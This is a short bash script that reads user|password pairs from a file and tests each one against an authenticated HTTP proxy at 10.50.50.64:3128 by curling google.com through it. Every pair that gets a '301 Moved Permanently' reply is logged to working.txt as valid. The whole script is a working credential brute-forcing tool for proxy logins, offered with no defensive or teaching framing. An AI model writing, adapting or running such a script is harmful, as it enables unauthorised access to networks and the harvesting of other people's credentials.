rm working.txt
touch working.txt
for i in `cat passwd`
do
            IFS='|' read -ra my_array <<< "$i"
            user=${my_array[0]}
            pass=${my_array[1]}
            http_proxy=http://$user:$pass@10.50.50.64:3128  curl -I http://google.com/ -o output.txt -s
        sleep 0.01
        line=$(head -n 1 output.txt)
        str="HTTP/1.1 301 Moved Permanently"
        if [[ $line == *"HTTP/1.1 301 Moved Permanently"* ]]; then
          echo $user-$pass
          echo $user-$pass >> working.txt 
        fi
        
done


